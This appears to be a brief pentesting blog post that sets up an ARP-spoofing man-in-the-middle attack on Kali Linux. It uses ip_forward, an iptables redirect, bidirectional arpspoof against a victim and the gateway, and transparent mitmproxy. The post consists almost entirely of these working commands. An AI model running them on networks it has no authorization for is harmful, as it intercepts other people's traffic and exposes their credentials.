---
layout: post
title: "Intercept HTTP Traffic with Mitmproxy and Arpspoof on Kali Linux"
tags: [mitmproxy, arp, kali, linux, network, pentesting]
---

1. Enable IP forwarding & port redirection
```bash
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
```

2. Use `tmux` to run 2 instances of `arpspoof`:
```bash
arpspoof -i <$INTERFACE> -t <$VICTIM_IP> <$GATEWAY_IP>
```
```bash
arpspoof -i <$INTERFACE> -t <$GATEWAY_IP> <$VICTIM_IP>
```

3. Run `mitmproxy` in transparent mode:
```bash
mitmproxy -T --host
```

---
1. [http://jeffq.com/blog/setting-up-a-man-in-the-middle-device-with-raspberry-pi-part-1/](http://jeffq.com/blog/setting-up-a-man-in-the-middle-device-with-raspberry-pi-part-1/)
